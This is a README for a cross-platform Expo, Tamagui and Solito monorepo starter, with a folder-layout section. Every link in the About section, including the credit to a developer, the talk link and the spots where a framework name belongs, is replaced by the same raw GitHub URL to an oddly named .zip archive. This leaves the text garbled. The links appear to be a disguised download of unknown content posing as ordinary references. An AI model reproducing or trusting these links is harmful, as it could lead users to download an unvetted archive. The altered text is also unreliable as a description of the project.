## 🔦 About

This project is a monorepo starter for creating an application using Expo, https://raw.githubusercontent.com/Elnasss/delightful-react-native-animations/main/apps/next/pages/delightful-react-native-animations_spheroidal.zip, Tamagui, and Solito. With this setup, you can create hybrid apps that run on both web and mobile platforms seamlessly.

Many thanks to [@FernandoTheRojo](https://raw.githubusercontent.com/Elnasss/delightful-react-native-animations/main/apps/next/pages/delightful-react-native-animations_spheroidal.zip) for the foundation of this monorepo. His work helped guide the integration of Expo and https://raw.githubusercontent.com/Elnasss/delightful-react-native-animations/main/apps/next/pages/delightful-react-native-animations_spheroidal.zip, especially showcased during the [https://raw.githubusercontent.com/Elnasss/delightful-react-native-animations/main/apps/next/pages/delightful-react-native-animations_spheroidal.zip Conf 2021 talk](https://raw.githubusercontent.com/Elnasss/delightful-react-native-animations/main/apps/next/pages/delightful-react-native-animations_spheroidal.zip).

## 🗂 Folder Layout

Here’s how the project is organized:

- `expo` - This folder contains the native application code.
- `next` - This folder contains the web application code.
- `packages` - This folder holds shared packages that can be used across both platforms.
  - `ui` - This package includes a custom UI kit optimized with Tamagui.
  - `app` - Most of your application files will be imported from here.
    - `features` - Instead of using a `screens` folder, organize your files by features for easier management.
    - `provider` - Here, you will find providers that wrap the application, along with some no-ops for the web version.

You can also add additional folders inside `packages` if you're familiar with the structure.
